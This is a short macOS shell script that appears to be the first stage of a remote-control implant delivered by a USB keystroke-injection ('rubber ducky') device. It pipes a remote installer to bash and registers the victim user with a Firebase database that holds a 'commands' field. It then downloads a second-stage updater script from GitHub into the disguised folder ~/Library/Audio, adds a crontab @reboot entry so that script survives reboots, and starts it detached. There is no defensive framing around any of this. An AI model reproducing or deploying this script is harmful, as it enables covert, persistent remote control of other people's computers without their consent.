sleep 5

# install pyenv
curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash
pyenv install 3.13

# cus it dont come with python
pip3 install requests

# add user.
curl -X PATCH -d "{\"$USER\": {\"commands\":[\"\"], \"executed\":false, \"name\":\"idk\", \"out\":\"\"}}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json

# curl 2_updater.sh
curl -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/2_updater.sh -o ~/Library/Audio/2_updater.sh

# RUN UPDATER @ REBOOT
# write out current crontab
crontab -l >mycron
# echo new cron into cron file
echo "@reboot ~/Library/Audio/2_updater.sh" >>mycron
# install new cron file
crontab mycron
rm mycron

# START UPDATER
sh ~/Library/Audio/2_updater.sh &
disown
